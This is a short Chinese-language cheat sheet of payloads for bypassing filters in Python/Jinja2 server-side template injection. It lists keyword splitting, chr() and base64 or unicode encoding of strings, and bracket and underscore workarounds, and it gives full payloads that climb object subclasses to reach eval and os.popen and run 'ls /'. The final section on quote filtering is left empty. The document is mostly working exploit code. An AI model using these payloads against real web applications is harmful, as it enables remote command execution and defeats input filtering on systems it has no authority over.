1. 关键字过滤：
```
"__im"+"port__"('o"+"s')
```

2. 编码绕过字符串
```
eval(chr(95)+chr(95)+.....)
```
对引号内的代码进行 base64编码后再后接 `.decode('base64')` 可以进行绕过

```
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['X19idWlsdGluc19f'.decode('base64')]['ZXZhbA=='.decode('base64')]('X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ=='.decode('base64'))}}
```

对引号内的代码进行 unicode 编码后再进行 decode 可以进行绕过。
```
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f']['\u0065\u0076\u0061\u006c']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['\u006f\u0073'].popen('\u006c\u0073\u0020\u002f').read()}}
```


3. 绕过中括号
```
xxx.getitem(0)
xxx.pop(40)
xxx.__getitem__(0)
```

4. 指令内绕过. 过滤：(记得多重调用)

字符内绕过
```
getattr(getattr(getattr(getattr)))
```

字符外绕过：
```
{{"".__class__}}={{""['__classs__']}}
```

5. 下划线绕过
```
dir[0][0]=_
```

6. 过滤了引号调用：
```

```

